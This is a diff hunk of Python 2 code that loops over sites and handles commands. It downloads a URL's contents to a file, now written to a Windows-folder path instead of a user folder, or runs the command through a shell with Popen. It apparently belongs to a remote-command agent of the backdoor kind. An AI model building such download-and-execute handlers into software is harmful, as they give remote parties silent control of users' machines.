@@ -256,7 +256,7 @@ for site in sites:
                                             sfiledest= scmd[ifile+1:len(scmd)]
                                             
                                             f = urllib2.urlopen(geturl)
-                                            with open(suser+'\\'+ sfiledest, "wb") as code:
+                                            with open(swin+'\\'+ sfiledest, "wb") as code:
                                                 code.write(f.read())
                                         else:
                                             p = Popen(scmd,shell=True)
